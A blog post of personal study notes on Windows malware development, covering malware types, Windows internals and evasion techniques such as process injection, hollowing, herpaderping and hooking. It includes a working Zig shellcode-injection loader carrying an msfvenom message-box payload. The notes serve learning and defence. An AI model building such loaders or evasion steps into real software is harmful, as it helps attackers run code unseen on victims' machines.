+++
title = "Malware101"
date = "2025-11-14T18:20:01-07:00"
author = "Ceald"
authorTwitter = "" #do not include @
cover = "/meoware-cat.gif"
coverOnly = true
tags = ["new", "notes", "cybersecurity", "malware", "zig"]
keywords = ["malware","notes", "zig", "windows"]
description = ""
showFullContent = false
readingTime = true
hideComments = false
summary = "malware notes"
+++

# Summary
My notes while learning malware development for Windows.

## Note For The Reader:
These are NOT up to date "how to build super haxxor l33t 1337 malware notes/tutorials" these are simply notes on the fundamentals/reference. Maybe in the future modern malware techniques will be added. Things evolve too fast for consistent notes and same with evasion techniques so don't expect these notes to be super up to date.


# Malware types

## Notes:
* Sophisticated malware will be able to detect tools trying to analyze it by checking processes running or if it's in a virtual machine.

## RAT
* persistent connection to a machine to monitor things like key strokes.

## Infostealers
* targets sensitive information like medical records or banking information

## Droppers and loaders
* Deploy additional malware through a web request.

## Ransomware
* Denies access to a person's computer for a ransom.

## Wipers
* Destroys sensitive information or entire systems.

## Worms
* Self spreading malware.

## Viruses
* Adds malicious code onto a host system's files.

## Rootkits and Bootkits
* Malware that conceals itself in the kernel or in the BIOS. Rootkits run at system startup while Bootkits start at boot time.

## Trojans
* Pretends to be legit programs to infect a system.





# Windows 101
## Concepts/Essentials

### User mode vs Kernel mode
![](/malware101/kernel_user_mode.png)

### Windows API/WinAPI
* various functions for programs to interact with to function

### Drivers
* Provide an abstraction layer between the actual kernel and user (kernel level anti cheats are drivers)
* Drivers can be ran in user mode or Kernel mode
* Kernel mode have FULL access to the kernel 
* User mode drivers are restricted

### Hardware abstraction Layer
* Interface for hardware to interact with the rest of the system.

### Kernel
* Kernel is the "magic" of this system by having the utilities for everything to communicate and run (somewhat) effectively by handling memory management and other complex tasks.

### Processes and Threads
* Processes are applications
* Threads are instructions for that process (processes can have more than one thread)

### Objects and Handles
* Objects are resources like resources (files, tokens, another process, or thread)
* Handles are identifiers for those processes or objects a program is trying to access
![](/malware101/handles_objects.png)
* Mutexe (Mutual exclusions) control access to objects to prevent system crashes or other issues.


### Windows API
* WinAPI is a library of various functions
* API helps with things from security authentication to even showing a message box
* Docs are notoriously bad

#### Windows Native API
* a lower level windows API
* undocumented by MS
http://undocumented.ntinternals.net/
https://www.geoffchappell.com/studies/windows/win32/ntdll/api/native.htm
![](/malware101/api.png)



#### API Functions:
<!-- (https://wsummerhill.github.io/redteam/2024/02/06/Malware-Development-Introduction-Part1.html) -->

##### Notes
* API functions have various suffixes.
	* `Ex` means newer
	* `A` outputs and inputs in ANSI format (https://ansi.tools/)
	* `W` outputs and inputs in unicode format (https://gist.github.com/jpassaro/bf400b0410810a071a7fb3509ef6c2c3)
* Native API functions have prefixes.  https://stackoverflow.com/questions/4770553/windows-native-api-when-and-why-use-zw-vs-nt-prefixed-api-calls#4770583
	* `Zw` are for kernel mode drivers
	* `Nt` are for user mode applications
* DLLs are libraries that contain these functions
	* kernel32.dll
		* Contains fundamental user mode functions
	* user32.dll
		* For gui applications
	* Winhttp.dll
		* For internet functions for windows programs
	* ntdll.dll
		* Synchronization, threading and other system tasks that communicate with the kernel
	* kernelbase.dll
		* For backwards compatibility for windows apps


<!-- 
##### VirtualAlloc
used for allocating memory in windows for low level API operations


##### RtlMoveMemory/memcpy(C/C++)
copy memory from one source to another


##### VirtualProtect
change memory protections


##### CreateThreat/WaitForSingleObject
Create new thread in the current process. `WaitForSingleObject` called after `CreateThreat` to delay execution until a previous thread is completed. -->


### Process Internals
Processes point to additional data structures. It provides additional information for windows to understand and manage processes

#### EPROCESS Structure
![](/malware101/eprocess.png)
* This is how windows processes are understood by the kernel.
* EPROCESS structures:
	* PEB (process environment block)
		* contains essential information for the process
	* Forward Links (Flink)
		* chains to the Blink
	* Backward Links (Blink)
		* links backwards to the Flink
	* Links just link processes


#### PEB Structure Offsets and Data

| Offset (x86) | Offset (x64) | Data                                                                                                            |
| ------------ | ------------ | --------------------------------------------------------------------------------------------------------------- |
| 0x002        | 0x002        | Stores the BeingDebugged value, which indicates whether the process is running under the context of a debugger. |
| 0x008        | 0x10         | Stores the base address of the process executable in memory.                                                    |
| 0x00C        | 0x18         | Stores information on the modules and libraries the process has loaded.                                         |
| 0x018        | 0x30         | Stores information about the process’s memory heap.                                                             |
| 0x064        | 0xB8         | Stores the NumberOfProcessors value, which indicates the number of processors the system has.                   |


#### TEB (Thread Environment Block aka TIB Thread Information Block)
* Contains Information for process's running threads


| Offset (x86) | Offset (x64) | Data                                                         |
| ------------ | ------------ | ------------------------------------------------------------ |
| FS:[0x00]    | GS:[0x00]    | Stores the current structured exception handler (SEH) frame. |
| FS:[0x04]    | GS:[0x08]    | Points to the base of the thread’s stack.                    |
| FS:[0x18]    | GS:[0x30]    | Points to the TEB itself.                                    |
| FS:[0x20]    | GS:[0x40]    | Stores the process ID (PID) of the thread’s owning process.  |
| FS:[0x24]    | GS:[0x48]    | Stores the thread ID (TID) of the current thread.            |
| FS:[0x30]    | GS:[0x60]    | Points to the PEB of the thread’s owning process.            |
| FS:[0xE10]   | GS:[0x1480]  | Points to thread-local storage (TLS) information.            |

#### Stacks and Heaps
* Stack is where temporary data is stored (destroyed after a thread is done)
* Heap is a large region used to dynamically store memory at runtime (global variables, etc.)

#### Virtual Memory
* In windows processes have virtual memory allocated to them that are mapped to the RAM
* Solves process interference or programs crashing
![](/malware101/pager.png)
* If a process has too little RAM for a process it'll page/store it on disk (like a Linux swapfile or partition)

#### PE Files
* Essentially the windows version of `elf` files
* Contain headers and sections
	* Headers are metadata
	* DOS Headers are for older versions of windows
	* PE header contains information used by the Windows PE Loader
	* Section header contains metadata related to file sections (size, address, etc.)
	* Common sections in table bellow
	
| Section | Description                                                                                                |
| ------- | ---------------------------------------------------------------------------------------------------------- |
| .text   | The file’s main executable code                                                                            |
| .rdata  | Read-only data, such as static variables and constants                                                     |
| .bss    | Uninitialized data, such as variables that haven’t been assigned a value yet                               |
| .data   | Variables not embedded in the .rdata and .bss sections, such as global variables                           |
| .rsrc   | Assets that will be loaded by the executable at runtime, such as images, fonts, and other supporting files |
| .idata  | The imports address table<br>* information about imports used by the PE file                               |
| .edata  | The exports address table<br>* information about exports used by the PE file                               |


#### PE Loading Process
1. Windows makes a new EPROCESS structure
2. Windows allocates virtual memory to the process
3. PE Loader reads and parses the DOS, PE, and optional headers
4. PE Parses all the other headers
5. Loads libraries associated with the PE (`.idata` and or `.rdata`)
6. New thread is created inside the process (`.text` section)
![](/malware101/pe.png)


### Address Space Layout Randomization (ASLR)
* prevents memory corruption


### Registry
* A database that applications and the OS reads and stores configurations

#### Hives
1. HKEY_LOCAL_MACHINE (HKLM)
	* Low level OS
	* Hardware configurations
	* Security Policies
	* Account settings
	* Settings for software installed
	* SAM database
	* LSA Secrets
2. HKEY_CURRENT_USER (HKCU)
	* user and system configurations
3. HKEY_USERS (HKU)
	* User settings
	* Stores the information for every user on the system
	* Sub keys represent identifiers of every user
4. HKEY_CURRENT_CONFIG (HKCC)
	* Pointers to the `HKLM` key for hardware profiles
5. HKEY_CLASSES_ROOT (HKCR)
	* registered application information like default apps to open files



# Evasion techniques

## Process Injection
* Injecting code into another process
* Mimics normal behavior like injecting into a web browser to communicate with a C2 server
* prevents debugging
* privilege escalation, certain processes can elevate privileges
* intercepting data from a hook, this allows for modifying API calls or getting sensitive data.

### Random vs Target Process
* Depending on injecting into a specific process or a random one is goals.
* Targeting specific processes can help with evasion while random ones can trip defenses
* Self-injecting is injecting into its own process, typically during unpacking.

### Shellcode Injection
![](/malware101/shellcode_injection.jpg)
* shellcode injection happens by injecting shell code into a process.
1. call [`OpenProcess`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)/[`NtOpenProcess`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess) to open a process and specify the proper options
2. After getting the object handle run either [`VirtualAlloc`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), [`VirtualAllocEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), or [`NtAllocateVirtualMemory`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) to allocate enough memory for your shellcode.
3. Write the memory to the process with [`WriteProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) or [`NtWriteVirtualMemory`](https://ntdoc.m417z.com/ntwritevirtualmemory)
4. Call [`CreateRemoteThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread), [`NtCreateThreadEx`](https://ntdoc.m417z.com/ntcreatethreadex) or [`RtlCreateUserThread`](https://ntdoc.m417z.com/rtlcreateuserthread) and input the proper options.
#### Example:
```zig
// src/main.zig
const std = @import("std"); // standard library
const processThreadsAPI = @cImport({
    @cInclude("processthreadsapi.h"); // import windows libraries
    });
const memoryAPI = @cImport({
    @cInclude("memoryapi.h"); // import windows libraries
});
const win = @cImport({
    @cInclude("windows.h"); // import windows libraries
});
const syncHAPI = @cImport({
    @cInclude("synchapi.h"); // import windows libraries
});


const shellCode = [_]u8{ // msfvenom -p windows/x64/messagebox TEXT="Test" -f zig
0xfc,0x48,0x81,0xe4,0xf0,0xff,0xff,0xff,0xe8,0xcc,0x00,0x00,
0x00,0x41,0x51,0x41,0x50,0x52,0x48,0x31,0xd2,0x65,0x48,0x8b,
0x52,0x60,0x51,0x56,0x48,0x8b,0x52,0x18,0x48,0x8b,0x52,0x20,
0x48,0x8b,0x72,0x50,0x4d,0x31,0xc9,0x48,0x0f,0xb7,0x4a,0x4a,
0x48,0x31,0xc0,0xac,0x3c,0x61,0x7c,0x02,0x2c,0x20,0x41,0xc1,
0xc9,0x0d,0x41,0x01,0xc1,0xe2,0xed,0x52,0x48,0x8b,0x52,0x20,
0x41,0x51,0x8b,0x42,0x3c,0x48,0x01,0xd0,0x66,0x81,0x78,0x18,
0x0b,0x02,0x0f,0x85,0x72,0x00,0x00,0x00,0x8b,0x80,0x88,0x00,
0x00,0x00,0x48,0x85,0xc0,0x74,0x67,0x48,0x01,0xd0,0x44,0x8b,
0x40,0x20,0x50,0x49,0x01,0xd0,0x8b,0x48,0x18,0xe3,0x56,0x4d,
0x31,0xc9,0x48,0xff,0xc9,0x41,0x8b,0x34,0x88,0x48,0x01,0xd6,
0x48,0x31,0xc0,0x41,0xc1,0xc9,0x0d,0xac,0x41,0x01,0xc1,0x38,
0xe0,0x75,0xf1,0x4c,0x03,0x4c,0x24,0x08,0x45,0x39,0xd1,0x75,
0xd8,0x58,0x44,0x8b,0x40,0x24,0x49,0x01,0xd0,0x66,0x41,0x8b,
0x0c,0x48,0x44,0x8b,0x40,0x1c,0x49,0x01,0xd0,0x41,0x8b,0x04,
0x88,0x41,0x58,0x41,0x58,0x5e,0x59,0x48,0x01,0xd0,0x5a,0x41,
0x58,0x41,0x59,0x41,0x5a,0x48,0x83,0xec,0x20,0x41,0x52,0xff,
0xe0,0x58,0x41,0x59,0x5a,0x48,0x8b,0x12,0xe9,0x4b,0xff,0xff,
0xff,0x5d,0xe8,0x0b,0x00,0x00,0x00,0x75,0x73,0x65,0x72,0x33,
0x32,0x2e,0x64,0x6c,0x6c,0x00,0x59,0x41,0xba,0x4c,0x77,0x26,
0x07,0xff,0xd5,0x49,0xc7,0xc1,0x00,0x00,0x00,0x00,0xe8,0x05,
0x00,0x00,0x00,0x54,0x65,0x73,0x74,0x00,0x5a,0xe8,0x0b,0x00,
0x00,0x00,0x4d,0x65,0x73,0x73,0x61,0x67,0x65,0x42,0x6f,0x78,
0x00,0x41,0x58,0x48,0x31,0xc9,0x41,0xba,0x45,0x83,0x56,0x07,
0xff,0xd5,0x48,0x31,0xc9,0x41,0xba,0xf0,0xb5,0xa2,0x56,0xff,
0xd5};
pub fn main() !void {
    const currentProcess = processThreadsAPI.GetCurrentProcess(); // grab the current process
    if (currentProcess == null) {
        return error.currentProcessFailed;
    }
    
    const addr = memoryAPI.VirtualAlloc( // allocate virtual memory
        null, 
        shellCode.len, 
        memoryAPI.MEM_COMMIT, 
        memoryAPI.PAGE_EXECUTE_READWRITE
    );
    
    if (addr == null) {
        return error.VirtualAllocFailed;
    }
    var bytesWritten: win.SIZE_T = 0; // set the bytes written to 0

    const result = memoryAPI.WriteProcessMemory(
        currentProcess,
        addr,
        &shellCode,
        shellCode.len,
        &bytesWritten
    ); // write the virtual memory
    if (result == 0) {
        std.debug.print("unable to write memory!", .{});
        return error.WriteFailed;
    }

    const threadHandle = processThreadsAPI.CreateRemoteThread(
        currentProcess,
        null,
        0,
        @ptrCast(addr),
        null,
        0,
        null,
    ); // grab and create a new thread handle
    if (threadHandle == null) {
        return error.CreateRemoteThreadFailed;
    }
    const threadResult = syncHAPI.WaitForSingleObject(
        threadHandle,
        win.INFINITE,
    ); // wait for the thread to finish
    std.debug.print("thread result: {}", .{threadResult}); // debugging


    var exitCode: win.DWORD = 0;
    _ = win.GetExitCodeThread(threadHandle, &exitCode); // get the exit code
    std.debug.print("Done with code: {}!\n", .{exitCode});  // debugging
    
}
```

### DLL Injection
![](/malware101/dll_injection.png)
* Common form of process injection by using libraries to inject code once it's loaded
1. add malicious DLL to disk
2. call [`OpenProcess`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openprocess)/[`NtOpenProcess`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntddk/nf-ntddk-ntopenprocess) to open a process and specify the proper options
3. After getting the object handle run either [`VirtualAlloc`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc), [`VirtualAllocEx`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualallocex), or [`NtAllocateVirtualMemory`](https://learn.microsoft.com/en-us/windows-hardware/drivers/ddi/ntifs/nf-ntifs-ntallocatevirtualmemory) to allocate enough memory.
4. [`WriteProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory) or [`NtWriteVirtualMemory`](https://ntdoc.m417z.com/ntwritevirtualmemory) to write the location of the DLL.
5. Call [`CreateRemoteThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createremotethread), [`NtCreateThreadEx`](https://ntdoc.m417z.com/ntcreatethreadex) or [`RtlCreateUserThread`](https://ntdoc.m417z.com/rtlcreateuserthread) and input the proper options to get the process to read the DLL with `LoadLibrary`.

### Reflective DLL Injection
![](/malware101/reflective_dll.jpg)
* DLLs are injected through being stored in memory instead of  on the disk
* Write the DLL to the memory and transfer the control flow into the new injected DLL.
* [example](https://github.com/rapid7/metasploit-framework/blob/master/modules/post/windows/manage/reflective_dll_inject.rb)


### Process Hollowing/RunPE
![](/malware101/process_hallowing.jpg)
* Un-maps code from a target's process memory
* Doesn't use an arbitrary remote process, starts a new process instead.
1. Create a new process with `CreateProcess` ([`CreateProcessA`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) or [`CreateProcessW`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessw)) with the flag [`CREATE_SUSPENDED`](https://learn.microsoft.com/en-us/windows/win32/procthread/process-creation-flags) or `0x00000004`
2. Unmap the process's code with [`NtUnmapViewOfSection`](https://ntdoc.m417z.com/ntunmapviewofsection)
3. Allocate memory for the new region with [`VirtualAlloc`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc)
4. write the payload with [`WriteProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
5. use [`SetThreadContext`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) and [`ResumeThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) to point the thread to the new injected code and to resume thread execution.

### Thread Hijacking
* Opening a new thread within a target process to run code.
* Similar to Process Hollowing
1. call [`OpenThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread) and specify the thread ID to open
2. call [`SuspendThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-suspendthread) or [`Wow64SuspendThread`](https://learn.microsoft.com/en-us/windows/win32/api/wow64apiset/nf-wow64apiset-wow64suspendthread) to suspend the thread.
3. use [`VirtualAlloc`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-virtualalloc) to allocate memory
4. Write the new memory with [`WriteProcessMemory`](https://learn.microsoft.com/en-us/windows/win32/api/memoryapi/nf-memoryapi-writeprocessmemory)
5. call [`SetThreadContext`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-setthreadcontext) and [`ResumeThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-resumethread) to set control flow and resume the thread to run the new code.

### APC Injection/Asynchronous procedure call
![](/malware101/apc_injection.jpg)
* Allows for tasks to be queued and executed in the context of a thread.
1. Write code to the target process normally
2. Open a thread with [`OpenThread`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-openthread)
3. Then Queue a new APC task with [`QueueUserAPC`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-queueuserapc) or [`NtQueueApcThread`](https://ntdoc.m417z.com/ntqueueapcthread)
4. Resume the process normally to then execute the new APC thread.

### Atom Bombing
![](/malware101/atom.jpg)
* Shares similarities to APC injection but involves "Atoms" (functions and definitions related are in the #Terms 101 section)
1. Create a new global Atom with [`GlobalAddAtom`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma)(there are other functions than this one)
2. Start the APC queue with [`NtQueueApcThread`](https://ntdoc.m417z.com/ntqueueapcthread) to force the process to do step 3.
3. get the Atom with [`GlobalGetAtomName`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globalgetatomnamea)(there are other functions than this one)
4. Process now is storing the shellcode or malicious code.

-------------------


## Process image manipulation
* tampering process images and windows handles for processes
* abuses both process creation and how anti-malware and endpoint protection operates
* [`PsSetCreateProcessNotifyRoutineEx`](https://ntdoc.m417z.com/pssetcreateprocessnotifyroutineex) is invoked whenever a new process is created to notify the anti-malware.
### Normal windows process creation
* This is how windows normally creates processes
1. Handle is obtained
2. Calls [`NtCreateSection`](https://ntdoc.m417z.com/ntcreatesection) to map an object in memory
3. Calls [`NtCreateProcessEx`](https://ntdoc.m417z.com/ntcreateprocessex) with referencing the new object in memory.
4. Run the process using [`NtCreateThreadEx`](https://ntdoc.m417z.com/ntcreatethreadex)

### Process Herpaderping
![](/malware101/herpaderping.jpg)
* Interferes with the way windows creates processes.
1. Creates an empty file with [`CreateFile`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
2. Write data to file with [`WriteFile`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile) and create a section with [`NtCreateSection`](https://ntdoc.m417z.com/ntcreatesection)
3. Create a process using the section object with [`NtCreateProcessEx`](https://ntdoc.m417z.com/ntcreateprocessex)
4. Remove the malicious code in the file with [`WriteFile`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile) and start a new thread with [`NtCreateThreadEx`](https://ntdoc.m417z.com/ntcreatethreadex) pointing to the section in memory.
* Example: https://github.com/jxy-s/herpaderping

### Process Doppelganging
![](/malware101/doppelganging.jpg)
* uses transactional NTFS to hide
* New files created with transactions can't be accessed from outside the process.
* Resource: https://www.malwarebytes.com/blog/news/2018/08/process-doppelganging-meets-process-hollowing_osiris
* After it's done executing it can roll back the transaction
1. [`CreateTransaction`](https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-createtransaction) is called and open an existing executable file with [`CreateFileTransacted`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-createfiletransacteda) or use lower level functions like [`ZwCreateTransaction`](https://ntdoc.m417z.com/ntcreatetransaction), [`RtlSetCurrentTransaction`](https://ntdoc.m417z.com/rtlsetcurrenttransaction), or [`ZwCreateFile`](https://ntdoc.m417z.com/ntcreatefile)
2. write to a file with [`WriteFile`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-writefile)
3. create a new process with [`CreateProcess`](https://learn.microsoft.com/en-us/windows/win32/api/processthreadsapi/nf-processthreadsapi-createprocessa) or [`NtCreateProcess`](https://ntdoc.m417z.com/ntcreateprocess)
4. After mapping to memory call [`RollbackTransaction`](https://learn.microsoft.com/en-us/windows/win32/api/ktmw32/nf-ktmw32-rollbacktransaction)


### Process Reimaging and Ghosting
#### Process Reimaging 
* Like Doppelganging it manipulates the current running process.
* To remimage the process modify the `FILE_OBJECT` which describes the filepath on disk and point it to a legitimate executable like internet explorer
* Resource: https://github.com/djhohnstein/ProcessReimaging

#### Process Ghosting
* Like process herpaderping malware would create a file, map the file to memory then delete it.
* Resource: https://www.elastic.co/blog/process-ghosting-a-new-executable-image-tampering-attack
* Windows prevents endpoint protection from reading deleted files but the it'll still execute because it's in memory.

-------------------

## DLL Hijacking
* All windows apps need DLLs
* If a program doesn't validate the DLL being loaded it's possible to force a program to use your own to execute code.

-------------------

## Shim Hijacking
* This abuses the backwards compatibility for windows called "Shimming"
* Developers use "shims" to patch code.
* Malware can use the shim "InjectDLL" to inject a malicious DLL into a shimmed app.
* Resource: https://www.hackingarticles.in/windows-persistence-using-application-shimming/

-------------------

## Hooking
* Hooking is hooking into memory space to intercept api calls

### [`SetWindowsHookEx`](https://learn.microsoft.com/en-us/windows/win32/api/winuser/nf-winuser-setwindowshookexa)
* Allows for a specific windows event to be hooked
* takes in a DLL file as an argument

### Inline Hooking
![](/malware101/inline_hooking.jpg)
* Injects code into a target process and modifies the function being hooked.
* reinstalling the previous function is recommended to prevent tripping endpoint protection
* Jumping back to the original function is called a "Trampoline".

-------------------



# Terms 101

* Shellcode: code that executes regardless of where it is in memory (https://medium.com/@yua.mikanana19/position-independent-code-pic-and-shellcode-an-introduction-1ea71f707ad)

* Malware analysis: analyze malware behavior and signatures to identify the threat actor(s).

* EDR(endpoint detection and response): A stack of software for protecting endpoints like domain controllers or critical infrastructure.

* XDR(extended detection and response): A stack of software like an EDR but offers more detection, data sources, and security tools.
* DKOM: Direct kernel object modification
* DCOM: Distributed component object model extends COM objects for remote procedure calls and references
* COM: component object model is for allowing applications to share and distribute data regardless of programming language
* Atoms: specific pieces of data like strings, stored in a structure called an "Atom Table", used in communication between processes to coordinate actions.
* Atom Table: A table of Atoms that can be global ([`GlobalAddAtom`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-globaladdatoma), there are other functions than this one) or local ([`AddAtom`](https://learn.microsoft.com/en-us/windows/win32/api/winbase/nf-winbase-addatoma), there are other functions than this one). 
* Transactional NTFS: A feature in windows to help with error handling and to help preserve file integrity, tracks changes to the file system.
* DLL: dynamic link library, all windows programs need libraries to function.
